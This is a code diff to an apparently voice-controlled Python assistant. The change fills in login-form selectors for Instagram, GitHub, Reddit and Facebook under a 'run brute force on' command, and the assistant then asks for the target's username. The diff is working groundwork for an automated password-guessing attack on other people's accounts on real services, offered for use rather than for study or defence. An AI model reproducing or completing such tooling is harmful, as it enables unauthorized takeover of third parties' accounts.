@@ -164,24 +164,24 @@ def main():
                         query = query.replace("run brute force on", "")
                         if 'instagram' in query:
                             website = 'https://www.instagram.com/accounts/login/'
-                            user_selector = ''
-                            pass_selector = ''
-                            enter = ''
+                            user_selector = '#loginForm > div > div:nth-child(1) > div > label > input'
+                            pass_selector = '#loginForm > div > div:nth-child(2) > div > label > input'
+                            enter = '#loginForm > div > div:nth-child(3) > button'
                         elif 'github' in query:
                             website = 'https://github.com/login'
-                            user_selector = ''
-                            pass_selector = ''
-                            enter = ''
+                            user_selector = '#login_field'
+                            pass_selector = '#password'
+                            enter = '#login > div.auth-form-body.mt-3 > form > div > input.btn.btn-primary.btn-block.js-sign-in-button'
                         elif 'reddit' in query:
                             website = 'https://www.reddit.com/login/'
-                            user_selector = ''
-                            pass_selector = ''
-                            enter = ''
+                            user_selector = '#loginUsername'
+                            pass_selector = '#loginPassword'
+                            enter = 'body > div > main > div.OnboardingStep.Onboarding__step.mode-auth > div > div.Step__content > form > fieldset:nth-child(8) > button'
                         elif 'facebook' in query:
                             website = 'https://www.facebook.com/login/'
-                            user_selector = ''
-                            pass_selector = ''
-                            enter = ''
+                            user_selector = '#email'
+                            pass_selector = '#pass'
+                            enter = '#u_0_5_Cb'
 
                         speak('What is the username of the target?')
                         username = takeCommand().lower()
